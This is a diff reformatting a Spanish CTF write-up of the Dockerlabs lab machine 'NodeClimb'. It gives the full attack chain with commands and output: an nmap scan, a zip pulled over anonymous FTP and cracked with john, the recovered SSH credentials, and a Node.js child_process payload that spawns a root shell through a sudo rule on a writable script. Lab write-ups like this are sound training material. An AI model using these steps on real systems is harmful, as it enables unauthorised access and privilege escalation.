@@ -1,22 +1,30 @@
-# 🖥️ Writeup - NodeClimb 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# NodeClimb ​​
+
+## 🖥️ Writeup - NodeClimb
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `FTP` `Node.js` `Anonymous FTP` `John The Ripper` `Cracking` `Sudoers` `Writable File`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip nodeclimb.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh nodeclimb.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p21,22 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 16:16 CET
 Nmap scan report for 172.17.0.2
@@ -98,7 +107,9 @@ Nos conectamos al servicio `FTP`.
 ```bash
 ftp 172.17.0.2
 ```
+
 Info:
+
 ```
 Connected to 172.17.0.2.
 220 (vsFTPd 3.0.3)
@@ -115,6 +126,7 @@ ftp> get secretitopicaron.zip
 ```
 
 Info:
+
 ```
 local: secretitopicaron.zip remote: secretitopicaron.zip
 229 Entering Extended Passive Mode (|||17333|)
@@ -131,13 +143,14 @@ unzip secretitopicaron.zip
 ```
 
 Info:
+
 ```
 Archive:  secretitopicaron.zip
 [secretitopicaron.zip] password.txt password: 
    skipping: password.txt            incorrect password
 ```
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Utilizamos la herramienta `zip2john` para extraer el `hash` de la contraseña del archivo.
 
@@ -146,6 +159,7 @@ zip2john secretitopicaron.zip > hash.txt
 ```
 
 Info:
+
 ```
 ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0
 ```
@@ -157,6 +171,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
 ```
 
 Info:
+
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -177,6 +192,7 @@ unzip secretitopicaron.zip
 ```
 
 Info:
+
 ```
 Archive:  secretitopicaron.zip
 [secretitopicaron.zip] password.txt password: 
@@ -190,14 +206,13 @@ cat password.txt
 mario:laKontraseñAmasmalotaHdelbarrioH
 ```
 
-Al leerlo, encontramos credenciales válidas para un usuario del sistema.
-Utilizamos estas credenciales para autenticarnos exitosamente a través del puerto `22` (SSH).
+Al leerlo, encontramos credenciales válidas para un usuario del sistema. Utilizamos estas credenciales para autenticarnos exitosamente a través del puerto `22` (SSH).
 
 ```bash
 ssh mario@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
@@ -206,6 +221,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for mario on f8c3e384992e:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -214,15 +230,14 @@ User mario may run the following commands on f8c3e384992e:
     (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
 ```
 
-Observamos que, a través del binario `node`, podemos ejecutar el archivo `script.js` con privilegios de `root`.
-El archivo `script.js` está vacío, pero tenemos permisos de escritura sobre él. 
-Por lo tanto, procedemos a inyectar un `payload` de `JavaScript` que nos permita escalar privilegios.
+Observamos que, a través del binario `node`, podemos ejecutar el archivo `script.js` con privilegios de `root`. El archivo `script.js` está vacío, pero tenemos permisos de escritura sobre él. Por lo tanto, procedemos a inyectar un `payload` de `JavaScript` que nos permita escalar privilegios.
 
 ```bash
 nano script.js
 ```
 
 Código:
+
 ```
 require('child_process').spawn('/bin/bash', ['-p'], {stdio: 'inherit'});
 ```
@@ -234,6 +249,7 @@ sudo /usr/bin/node /home/mario/script.js
 ```
 
 Info:
+
 ```
 root@f8c3e384992e:/home/mario# whoami
 root
